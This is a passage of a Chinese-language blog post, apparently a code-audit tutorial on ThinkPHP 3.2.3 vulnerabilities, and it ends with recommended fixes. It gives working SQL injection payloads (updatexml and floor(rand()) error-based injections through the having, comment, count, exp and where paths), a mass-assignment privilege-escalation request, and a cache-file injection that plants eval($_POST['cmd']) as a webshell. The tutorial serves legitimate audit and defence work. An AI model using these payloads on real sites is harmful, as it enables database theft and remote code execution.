+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?score=2,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>
+
+<p><strong>实例having</strong></p>
+<p>同上<br>当having的参数可控时，便可进行注入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$data=M(<span class="string">'User'</span>)</span><br><span class="line">    -&gt;field(<span class="string">'max(id),username'</span>)</span><br><span class="line">    -&gt;group(I(<span class="string">'group'</span>))</span><br><span class="line">    -&gt;having(I(<span class="string">'having'</span>))</span><br><span class="line">    -&gt;select();</span><br><span class="line">    dump($data);</span><br></pre></td></tr></table></figure>
+
+<p>传入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?group=id,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>
+
+<p>最终sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">max</span>(<span class="keyword">id</span>),<span class="string">`username`</span> <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">id</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)<span class="keyword">SELECT</span> <span class="keyword">max</span>(<span class="keyword">id</span>),<span class="string">`username`</span> <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588219225919.png" alt="1588219225919"></p>
+<h3 id="comment方法"><a href="#comment方法" class="headerlink" title="comment方法"></a>comment方法</h3><p><strong>comment</strong><br>COMMENT方法 用于在生成的SQL语句中添加注释内容，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;comment(<span class="string">'aaaaa'</span>)</span><br><span class="line">-&gt;field(<span class="string">'username,score'</span>)</span><br><span class="line">-&gt;limit(<span class="number">10</span>)</span><br><span class="line">-&gt;order(<span class="string">'score desc'</span>)</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>最终生成的SQL语句是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,score <span class="keyword">FROM</span> think_score <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">desc</span> <span class="keyword">LIMIT</span> <span class="number">10</span> <span class="comment">/* aaaaa*/</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588473496097.png" alt="1588473496097"></p>
+<p><strong>实例：</strong><br>当comment的参数可控时，便存在漏洞。代码如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M('User')-&gt;where('1=1')-&gt;comment(I('com'))-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>构造语句如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?com=aaa*/ and 1=updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+
+<p>生成sql语句如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">WHERE</span> ( <span class="number">1</span>=<span class="number">1</span> )  <span class="comment">/* aaa*/</span> <span class="keyword">and</span> <span class="number">1</span>=updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment"># */</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588473704606.png" alt="1588473704606"></p>
+<h3 id="query-execute-聚合方法"><a href="#query-execute-聚合方法" class="headerlink" title="query/execute/聚合方法"></a><strong>query/execute/聚合方法</strong></h3><p>query方法用于执行SQL查询操作，如果数据非法或者查询错误则返回false，否则返回查询结果数据集（同select方法）。</p>
+<p>使用示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Model = <span class="keyword">new</span> user() <span class="comment">// 实例化一个model对象 没有对应任何数据表</span></span><br><span class="line">$Model-&gt;query(<span class="string">"select * from thinkphp_user where status=1"</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>实例化一个空模型后，使用query方法查询数据<br>$data = M()-&gt;query(‘select * from thinkphp_user’);</p>
+<p>dump($data);</p>
+</blockquote>
+<p><strong>EXECUTE方法</strong></p>
+<p>execute用于更新和写入数据的sql操作，如果数据非法或者查询错误则返回false ，否则返回影响的记录数。</p>
+<p>使用示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Model = <span class="keyword">new</span> \Think\Model() <span class="comment">// 实例化一个model对象 没有对应任何数据表</span></span><br><span class="line">$Model-&gt;execute(<span class="string">"update think_user set name='thinkPHP' where status=1"</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>M()-&gt;execute(“update thinkphp_user set username=’user’ where id=1”);</p>
+</blockquote>
+<p><strong>聚合方法</strong><br>count，max，avg，sum，min这五个方法的注入场景类似</p>
+<blockquote>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$<span class="class"><span class="keyword">data</span> = <span class="type">M</span>('<span class="title">user'</span>)-&gt;count(<span class="type">I</span>('<span class="title">count'</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="title">dump</span>($<span class="class"><span class="keyword">data</span>);</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>传入<br>count=*<br>生成的sql语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW COLUMNS FROM `thinkphp_user` [ RunTime:0.0014s ]</span><br><span class="line">SELECT COUNT(*) AS tp_count FROM `thinkphp_user` LIMIT 1 [ RunTime:0.0003s ]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588478044142.png" alt="1588478044142"></p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username) as tp_count FROM `thinkphp_user` where 1=1 and updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> <span class="keyword">version</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588478110812.png" alt="1588478110812"></p>
+<p>此时的SQL语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(username) <span class="keyword">as</span> tp_count <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">version</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>成实现注入</p>
+<h2 id="EXP注入"><a href="#EXP注入" class="headerlink" title="EXP注入"></a>EXP注入</h2><p><strong>EXP：表达式</strong></p>
+<p>支持更复杂的查询情况 例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$map['id']  = array('in','1,3,8');</span><br></pre></td></tr></table></figure>
+
+<p>可以改成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$map['id']  = array('exp',' IN (1,3,8) ');</span><br></pre></td></tr></table></figure>
+
+<p>exp查询的条件不会被当成字符串，所以后面的查询条件可以使用任何SQL支持的语法，包括使用函数和字段名称。查询表达式不仅可用于查询条件，也可以用于数据更新，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$User = M("User"); // 实例化User对象</span><br><span class="line">// 要修改的数据对象属性赋值</span><br><span class="line">$data['name'] = 'ThinkPHP';</span><br><span class="line">$data['score'] = array('exp','score+1');// 用户的积分加1</span><br><span class="line">$User-&gt;where('id=5')-&gt;save($data); // 根据条件保存修改的数据</span><br></pre></td></tr></table></figure>
+
+<p><strong>实例</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$map=<span class="keyword">array</span>();  </span><br><span class="line">$map[<span class="string">'id'</span>]=$_GET[<span class="string">'id'</span>];  </span><br><span class="line">$data=M(<span class="string">'User'</span>)-&gt;where($map)-&gt;find();  </span><br><span class="line">dump($data);</span><br></pre></td></tr></table></figure>
+
+<p>传入id=1,此时的SQL语句为</p>
+<blockquote>
+<ol>
+<li>SHOW COLUMNS FROM <code>thinkphp_user</code> [ RunTime:0.0013s ]</li>
+<li>SELECT * FROM <code>thinkphp_user</code> WHERE <code>id</code> = 1 LIMIT 1   [ RunTime:0.0007s ]</li>
+</ol>
+</blockquote>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588583393508.png" alt="1588583393508"></p>
+<p>当传入参数可控且无过滤时，构造如下payload：</p>
+<blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[0]=exp&amp;id[1]==1%20and%201=updatexml(1,concat (0x7e,(<span class="keyword">SELECT</span>%<span class="number">20</span>@@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588583716549.png" alt="1588583716549"></p>
+<p>此时的SQL语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span> =<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment"># LIMIT 1</span></span><br></pre></td></tr></table></figure>
+
+<p>修复方法：使用官方推荐的I()方法传入参数就可以很好地过滤传入的参数，修复此漏洞。</p>
+<p><strong>断点调试</strong></p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588584159093.png" alt="1588584159093"></p>
+<p>跟到<code>ThinkPHP\Library\Think\Model.class.php</code>的<code>select</code>函数</p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588584224824.png" alt="1588584224824"></p>
+<p>再跟到select函数中，再进入<code>buildSelectSql</code>函数中<br><img src="/2020/05/05/ThinkPHP3.2.3/1588584294380.png" alt="1588584294380"></p>
+<p>之后进入到<code>parseSql</code>函数中</p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588584411090.png" alt="1588584411090"></p>
+<p>继续F7进入，直到进入parseWhereItem函数<br><img src="/2020/05/05/ThinkPHP3.2.3/1588584737080.png" alt="1588584737080"></p>
+<p>$exp的值是$val[0]的值，也就是poc中的exp，经过判断以后，直接吧$key和$val[1]进行了字符串拼接</p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588584841471.png" alt="1588584841471"></p>
+<p>val值就是我们刚才传入进来的值，拼接以后变成</p>
+<blockquote>
+<p><code>id</code> =1 and 1=updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)# LIMIT 1</p>
+</blockquote>
+<p>最终导致注入</p>
+<h2 id="Action参数绑定注入"><a href="#Action参数绑定注入" class="headerlink" title="Action参数绑定注入"></a>Action参数绑定注入</h2><p>一般审计的时候先查找I方法或者$_GET、$_POST等原生态的请求，从而忽略掉action参数传入的变量</p>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data = M(<span class="string">'user'</span>)-&gt;field(<span class="string">'username'</span>)</span><br><span class="line">                            -&gt;where($id)</span><br><span class="line">                            -&gt;select();</span><br><span class="line">    dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果带人到where方法里，表示以字符的形式查询，也就造成了注入。<br><strong>案例：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intval($id) &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        $data = M(<span class="string">'User'</span>)-&gt;where(<span class="string">'id='</span> . $id)-&gt;select();</span><br><span class="line">        dump($data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如上代码中使用$_GET方式获取参数，但未进行过滤操作，导致存在注入漏洞。<br>构造如下语句，便可进行注入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>) <span class="keyword">and</span> <span class="number">1</span>=updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT @@version),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>最后生成的sql语句如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `thinkphp_user` WHERE ( id=<span class="number">1</span>) <span class="keyword">and</span> <span class="number">1</span>=updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT @@version),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment"># )</span></span><br></pre></td></tr></table></figure>
+
+<p>可以使用如下正则去查找是否存在此漏洞：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public\s+function\s+[\w_*]+\(\$</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="组合注入"><a href="#组合注入" class="headerlink" title="组合注入"></a>组合注入</h2><p>组合查询主体还是采用数组方式查询，只是加入了一些特殊的查询支持，包括字符串模式查询(_string)、请求字符串查询(_query)</p>
+<p>*<em>_string 注入 *</em></p>
+<p><strong>字符串模式查询</strong></p>
+<p>数组条件可以和字符串条件（采用_string 作为查询条件）混合使用，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$User = M(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$map[<span class="string">'id'</span>] = <span class="keyword">array</span>(<span class="string">'neq'</span>,<span class="number">1</span>);</span><br><span class="line">$map[<span class="string">'name'</span>] = <span class="string">'ok'</span>;</span><br><span class="line">$map[<span class="string">'_string'</span>] = <span class="string">'status=1 AND score&gt;10'</span>;</span><br><span class="line">$User-&gt;where($map)-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>最后得到的查询条件就成了：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( `id` != 1 ) AND ( `name` = 'ok' ) AND ( status=1 AND score&gt;10 )</span><br></pre></td></tr></table></figure>
+
+<p><strong>_query注入</strong></p>
+<p><strong>请求字符串查询方式</strong></p>
+<p>请求字符串查询是一种类似于URL传参的方式，可以支持简单的条件相等判断。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$map[<span class="string">'id'</span>] = <span class="keyword">array</span>(<span class="string">'gt'</span>,<span class="string">'100'</span>);</span><br><span class="line">$map[<span class="string">'_query'</span>] = <span class="string">'status=1&amp;score=100&amp;_logic=or'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>得到的查询条件是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`id`&gt;<span class="number">100</span> <span class="keyword">AND</span> (`status` = <span class="string">'1'</span> <span class="keyword">OR</span> `score` = <span class="string">'100'</span>)</span><br><span class="line">案例：</span><br><span class="line">$User = M(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$map[<span class="string">'id'</span>] = <span class="keyword">array</span>(<span class="string">'neq'</span>,<span class="number">1</span>);</span><br><span class="line">$map[<span class="string">'name'</span>] = <span class="string">'ok'</span>;</span><br><span class="line">$map[<span class="string">'_string'</span>] = <span class="string">'score='</span>.I(<span class="string">'score'</span>);</span><br><span class="line">$User-&gt;where($map)-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>利用方式同Action参数注入。</p>
+<h1 id="其他漏洞审计"><a href="#其他漏洞审计" class="headerlink" title="其他漏洞审计"></a>其他漏洞审计</h1><h2 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h2><p><strong>自动完成</strong></p>
+<p>自动完成是ThinkPHP提供用来完成数据自动处理和过滤的方法，使用create方法创建数据对象的时候会自动完成数据处理。</p>
+<p>因此，在ThinkPHP使用create方法来创建数据对象是更加安全的方式，而不是直接通过add或者save方法实现数据写入。</p>
+<p><strong>静态定义</strong></p>
+<p>预先在模型类里面定义好自动完成的规则，我们称之为静态定义。例如，我们在模型类定义<code>_auto</code>属性：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">     <span class="keyword">protected</span> $_auto = <span class="keyword">array</span> ( </span><br><span class="line">         <span class="keyword">array</span>(<span class="string">'status'</span>,<span class="string">'1'</span>),  <span class="comment">// 新增的时候把status字段设置为1</span></span><br><span class="line">         <span class="keyword">array</span>(<span class="string">'password'</span>,<span class="string">'md5'</span>,<span class="number">3</span>,<span class="string">'function'</span>) , <span class="comment">// 对password字段在新增和编辑的时候使md5函数处理</span></span><br><span class="line">         <span class="keyword">array</span>(<span class="string">'name'</span>,<span class="string">'getName'</span>,<span class="number">3</span>,<span class="string">'callback'</span>), <span class="comment">// 对name字段在新增和编辑的时候回调getName方法</span></span><br><span class="line">         <span class="keyword">array</span>(<span class="string">'update_time'</span>,<span class="string">'time'</span>,<span class="number">2</span>,<span class="string">'function'</span>), <span class="comment">// 对update_time字段在更新的时候写入当前时间戳</span></span><br><span class="line">     );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后，就可以在使用create方法创建数据对象的时候自动处理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$User = D(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line"><span class="keyword">if</span> (!$User-&gt;create())&#123; <span class="comment">// 创建数据对象</span></span><br><span class="line">     <span class="comment">// 如果创建失败 表示验证没有通过 输出错误提示信息</span></span><br><span class="line">     <span class="keyword">exit</span>($User-&gt;getError());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="comment">// 验证通过 写入新增数据</span></span><br><span class="line">     $User-&gt;add();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果没有定义任何自动验证规则，则不需要判断create方法的返回值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$User = D(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$User-&gt;create(); <span class="comment">// 生成数据对象</span></span><br><span class="line">$User-&gt;add(); <span class="comment">// 新增用户数据</span></span><br></pre></td></tr></table></figure>
+
+<p>或者更简单的使用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$User = D(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$User-&gt;create(); <span class="comment">// 生成数据对象</span></span><br><span class="line">$User-&gt;add(); <span class="comment">// 写入数据</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>案例：</strong><br>当Model使用未经过滤的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $_auto = <span class="keyword">array</span> (  </span><br><span class="line">  <span class="keyword">array</span>(<span class="string">'password'</span>,<span class="string">'md5'</span>,<span class="number">3</span>,<span class="string">'function'</span>) , <span class="comment">// 对password字段在新增和编辑的时候使md5函数处理  </span></span><br><span class="line">  <span class="keyword">array</span>(<span class="string">'score'</span>,<span class="string">'10'</span>),<span class="comment">//普通会员注册给10分  </span></span><br><span class="line">  <span class="keyword">array</span>(<span class="string">'username'</span>,<span class="string">''</span>,<span class="number">3</span>,<span class="string">'ignore'</span>),  </span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>再使用如下代码调用时，便会存在漏洞。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$User = D(<span class="string">"User"</span>); <span class="comment">// 实例化User对象  </span></span><br><span class="line"><span class="keyword">if</span> (!$User-&gt;create())&#123; <span class="comment">// 创建数据对象  </span></span><br><span class="line"> <span class="comment">// 如果创建失败 表示验证没有通过 输出错误提示信息  exit($User-&gt;getError());  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">  <span class="comment">// 验证通过 写入新增数据  </span></span><br><span class="line">  $User-&gt;add();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当使用如下url访问时：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/ThinkPHP/index.php/home/User/addUser</span></span><br><span class="line">post：username=ad&amp;password=<span class="number">123</span>&amp;score=<span class="number">21</span></span><br></pre></td></tr></table></figure>
+
+<p>其最后sql语句为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `thinkphp_user` (`username`,`password`) VALUES (<span class="string">'ad'</span>,<span class="string">'123'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后，当使用下面url访问时便可造成越权</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/ThinkPHP/index.php/home/User/addUser</span></span><br><span class="line">post：username=a&amp;password=<span class="number">123</span>&amp;score=<span class="number">21</span>&amp;level=<span class="number">2</span></span><br><span class="line">其中level表示注册的会员等级（level默认为<span class="number">0</span>）</span><br></pre></td></tr></table></figure>
+
+<h2 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a>缓存漏洞</h2><p><strong>数据缓存，快速缓存参考<a href="http://document.thinkphp.cn/manual_3_2.html#fast_cache" target="_blank" rel="noopener">thinkphp3.2.3完全开发手册</a></strong></p>
+<p>漏洞代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $a=I(<span class="string">'post.a'</span>);</span><br><span class="line">    S(<span class="string">'name'</span>,$a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后使用post传入</p>
+<blockquote>
+<p>a=phpinfo();</p>
+</blockquote>
+<p>在<code>application/runtime/temp/</code>目录中成功生成里缓存文件</p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588660627551.png" alt="1588660627551"></p>
+<p>由于被注释了，所以使用<code>%0d%0a</code>换行来绕过行注释</p>
+<blockquote>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0d%0aeval($_POST[<span class="string">'cmd'</span>]);%0d%0a<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588661596159.png" alt="1588661596159"></p>
+<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>常规注入过滤<br>1.where 方法<br>Where、query、execute 方法建议采用预处理机制，抛开传统的拼接 SQL 语句的思想<br>采用下面的条件预处理<br>$Model-&gt;where(“id=%d and username=’%s’ and xx=’%f’”,array($id,$username,$xx))-&gt;select();<br>$model-&gt;query(‘select * from user where id=%d and status=%d’,$id,$status); </p>
+<p>2.Field、table 等方法<br>如果需要从获取外界的值，一定要对这些值进行安全过滤，比如过滤掉 Mysql 里的三大注释符 – -、#、/**/ 、还有一个反引号 ` </p>
+<p>3.Exp 注入限制<br>只需配置  REQUEST_VARS_FILTER = true </p>
+<p>4.缓存设置<br>官方推荐设置 DATA_CACHE_KEY 参数，避免缓存文件名被猜测到。 </p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>thinkphp3框架常见漏洞</p>
